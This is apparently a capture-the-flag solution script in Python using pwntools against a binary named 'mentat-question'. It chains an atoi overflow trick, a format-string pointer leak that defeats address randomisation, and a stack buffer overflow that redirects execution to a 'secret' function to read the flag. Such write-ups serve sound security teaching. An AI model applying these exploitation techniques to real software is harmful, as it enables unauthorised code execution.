from pwn import *

p = gdb.debug("./mentat-question")
e = ELF("./mentat-question")

p.sendlineafter(b"?", b"Division")
p.sendlineafter(b"?", b"123")
# This line causes atoi to return 0 despite no "0" char being entered.
p.sendline(str(2**32).encode('ascii')) # Can also just be non-number chars.

p.sendlineafter(b"?", b"Yes %p") # Leaks pointer in RSI register using format string vuln, which happens to be offset by 0x206d from the executable base.

p.recvline() # Clear a newline.

leak = int(p.recvline()[15:29], 16) # Gives back 6 bytes of address.
e.address = leak - 0x206d # 0x206d is the offset from the pointer stored in RSI to the base of the executable.
# Now that e.address has the base of the executable, things like e.symbols can return correct addresses.

# On the second loop, use the leaked address to get to the secret function!
p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode('ascii')) # Can also just be non-number chars.

# Send a string long enough to overwrite the return address with the secret function. Adding 4 to avoid a stack alignment issue that would cause a jump to MOVAPS.
p.sendlineafter(b"?", b"Yes AAAAAAAAAAAAAAAAAAAA" + p64(e.symbols["secret"] + 4)) # MOVAPS AHHHHHH

p.interactive()

# Now just type "cat flag.txt" to win.
